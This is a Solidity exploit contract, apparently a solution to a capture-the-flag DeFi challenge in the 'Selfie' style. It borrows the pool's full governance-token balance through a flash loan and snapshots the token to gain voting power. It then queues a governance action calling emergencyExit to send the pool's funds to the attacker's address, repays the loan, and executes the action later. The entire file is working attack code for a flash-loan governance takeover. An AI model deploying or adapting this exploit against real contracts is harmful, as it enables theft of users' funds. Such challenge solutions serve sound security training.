// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ISimpleGovernance.sol";
import "hardhat/console.sol";

interface ISelfiePool {
    function maxFlashLoan(address) external view returns(uint256);
    function flashLoan(address, address, uint256, bytes calldata) external returns(bool);
    function emergencyExit(address) external;
    function token() external returns(address);
}

interface IGovernanceToken {
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function snapshot() external returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract AttactContract {

    ISimpleGovernance private immutable simpleGovernance;
    ISelfiePool private immutable selfiePool;
    address private immutable owner;
    IGovernanceToken private immutable governanceToken;
    uint256 private withdrawAction;

    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
    
    constructor(ISimpleGovernance _simpleGovernance, ISelfiePool _selfiePool) {
        simpleGovernance = _simpleGovernance;
        selfiePool = _selfiePool;
        governanceToken = IGovernanceToken(selfiePool.token());
        owner = msg.sender;
    }

    function attack() external {
        uint256 amountToLend = selfiePool.maxFlashLoan(address(governanceToken));
        selfiePool.flashLoan(
            address(this), 
            address(governanceToken), 
            amountToLend,
            "");
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        // snapshot needed to pass _hasEnoughVotes check
        governanceToken.snapshot();
        // create Action is avialible cuz we hold some tokens
        withdrawAction = simpleGovernance.queueAction(
            address(selfiePool),
            0,
            abi.encodeWithSignature(
                "emergencyExit(address)", 
                owner
            )
        );
        // approve to payback lended tokens
        governanceToken.approve(address(selfiePool), amount);
        return CALLBACK_SUCCESS;
    }

    function getAllTokens() external {
        simpleGovernance.executeAction(withdrawAction);
    }
}
